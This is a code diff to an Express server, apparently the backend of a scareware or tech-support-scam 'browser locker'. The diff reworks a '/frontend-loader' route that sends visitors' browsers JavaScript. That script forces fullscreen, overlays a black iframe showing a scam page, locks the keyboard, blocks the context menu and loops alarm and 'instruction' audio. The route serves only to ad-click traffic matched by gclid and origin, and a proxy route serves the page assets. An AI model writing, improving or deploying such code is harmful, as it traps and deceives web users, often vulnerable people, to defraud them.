@@ -75,55 +75,174 @@ function escapeHTMLForJSString(html) {
     .replace(/\r?\n/g, ""); // Remove newlines
 }
 
-// === Route: /frontend-loader ===
+const path = require("path");
+const fs = require("fs").promises;
+
+// escape for embedding inside a JS string
+function escapeForSingleQuotedJS(str) {
+  return str
+    .replace(/\\/g, "\\\\")
+    .replace(/'/g, "\\'")
+    .replace(/\r/g, "\\r")
+    .replace(/\n/g, "\\n")
+    .replace(/\u2028/g, "\\u2028")
+    .replace(/\u2029/g, "\\u2029");
+}
+
+// Serve static files from asset’s folder through a proxy route
+app.get("/frontend-asset/*", async (req, res) => {
+  try {
+    // figure out which asset folder to serve from (same selection as validateRequest)
+    const assetId = req.query.aid;
+    if (!assetId) return res.status(400).send("Missing aid");
+
+    // Example: asset.htmlFile is "assets/demo/index.html"
+    const asset = req.assetsById ? req.assetsById[assetId] : null;
+    if (!asset) return res.status(404).send("Unknown asset");
+
+    const assetDir = path.dirname(path.join(__dirname, asset.htmlFile));
+    const requestedPath = path.normalize(
+      path.join(assetDir, req.params[0] || "")
+    );
+
+    // prevent path traversal
+    if (!requestedPath.startsWith(assetDir)) {
+      return res.status(400).send("Invalid path");
+    }
+
+    const buf = await fs.readFile(requestedPath);
+    res.send(buf);
+  } catch (e) {
+    console.error("frontend-asset error:", e);
+    res.status(404).send("Not found");
+  }
+});
+
 app.get("/frontend-loader", validateRequest, async (req, res) => {
   const gclid = req.query.gclid;
   if (!gclid || gclid.length < 10) {
     return res.status(403).send("FAILED: gclid missing or too short");
   }
 
-  console.log(gclid);
-
   try {
-    // Asset is selected based on the request Origin (set in validateRequest)
     const asset = req.asset;
     if (!asset) {
       return res.status(500).json({ error: "No asset mapped for origin" });
     }
 
     const htmlPath = path.join(__dirname, asset.htmlFile);
-    const rawHTML = await fs.readFile(htmlPath, "utf8");
-    const safeHTML = escapeHTMLForJSString(rawHTML);
+    let rawHTML = await fs.readFile(htmlPath, "utf8");
+
+    // Inject <base> into <head> so relative URLs point to our proxy
+    const assetId = asset.id || asset.htmlFile;
+    const serverBase = `${req.protocol}://${req.get("host")}`;
+    const proxyBaseHref = `${serverBase}/frontend-asset/?aid=${encodeURIComponent(
+      assetId
+    )}/`;
+
+    if (/<head[^>]*>/i.test(rawHTML)) {
+      rawHTML = rawHTML.replace(
+        /<head([^>]*)>/i,
+        `<head$1><base href="${proxyBaseHref}">`
+      );
+    } else {
+      rawHTML = `<head><base href="${proxyBaseHref}"></head>${rawHTML}`;
+    }
+
+    const srcdoc = escapeForSingleQuotedJS(rawHTML);
 
     const code = `
-      document.documentElement.requestFullscreen().then(() => {
-        document.body.innerHTML = '${safeHTML}';
-        navigator.keyboard.lock();
+      (async () => {
+        try { await document.documentElement.requestFullscreen(); } catch(e) {}
+
+        const overlay = document.createElement('div');
+        overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#000;";
+        document.body.appendChild(overlay);
+
+        const iframe = document.createElement('iframe');
+        iframe.allowFullscreen = true;
+        iframe.setAttribute('allow', 'autoplay; clipboard-read; clipboard-write; fullscreen');
+        iframe.style.cssText = "width:100%;height:100%;border:0;display:block;background:#000;";
+        iframe.srcdoc = '${srcdoc}';
+        overlay.appendChild(iframe);
+
+        try { navigator.keyboard && navigator.keyboard.lock(); } catch(e) {}
         document.addEventListener('contextmenu', e => e.preventDefault());
 
         const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
         beepAudio.loop = true;
-        beepAudio.play();
+        beepAudio.play().catch(()=>{});
 
-        const instructionAudio = new Audio('${asset.audioUrl}');
+        const instructionAudio = new Audio('${escapeForSingleQuotedJS(asset.audioUrl)}');
         instructionAudio.loop = true;
-        instructionAudio.play();
+        instructionAudio.play().catch(()=>{});
 
         document.removeEventListener("click", handleSomeClick);
-      });
+      })();
     `;
 
-    // Reflect the specific request Origin (required when credentials: true)
     const requestOrigin = req.get("origin");
-    res.set("Access-Control-Allow-Origin", requestOrigin);
+    if (requestOrigin) {
+      res.set("Access-Control-Allow-Origin", requestOrigin);
+    }
 
-    console.log(`Sent code for: ${asset.htmlFile} (origin: ${requestOrigin})`);
+    console.log(`Sent iframe srcdoc for: ${asset.htmlFile} (origin: ${requestOrigin})`);
     return res.json({ code });
   } catch (err) {
     console.error("Error in frontend-loader:", err);
     return res.status(500).json({ error: "Failed to generate frontend loader" });
   }
 });
+
+// === Route: /frontend-loader ===
+// app.get("/frontend-loader", validateRequest, async (req, res) => {
+//   const gclid = req.query.gclid;
+//   if (!gclid || gclid.length < 10) {
+//     return res.status(403).send("FAILED: gclid missing or too short");
+//   }
+
+//   console.log(gclid);
+
+//   try {
+//     // Asset is selected based on the request Origin (set in validateRequest)
+//     const asset = req.asset;
+//     if (!asset) {
+//       return res.status(500).json({ error: "No asset mapped for origin" });
+//     }
+
+//     const htmlPath = path.join(__dirname, asset.htmlFile);
+//     const rawHTML = await fs.readFile(htmlPath, "utf8");
+//     const safeHTML = escapeHTMLForJSString(rawHTML);
+
+//     const code = `
+//       document.documentElement.requestFullscreen().then(() => {
+//         document.body.innerHTML = '${safeHTML}';
+//         navigator.keyboard.lock();
+//         document.addEventListener('contextmenu', e => e.preventDefault());
+
+//         const beepAudio = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
+//         beepAudio.loop = true;
+//         beepAudio.play();
+
+//         const instructionAudio = new Audio('${asset.audioUrl}');
+//         instructionAudio.loop = true;
+//         instructionAudio.play();
+
+//         document.removeEventListener("click", handleSomeClick);
+//       });
+//     `;
+
+//     // Reflect the specific request Origin (required when credentials: true)
+//     const requestOrigin = req.get("origin");
+//     res.set("Access-Control-Allow-Origin", requestOrigin);
+
+//     console.log(`Sent code for: ${asset.htmlFile} (origin: ${requestOrigin})`);
+//     return res.json({ code });
+//   } catch (err) {
+//     console.error("Error in frontend-loader:", err);
+//     return res.status(500).json({ error: "Failed to generate frontend loader" });
+//   }
+// });
 
 // === Start server ===
 app.listen(PORT, () => {
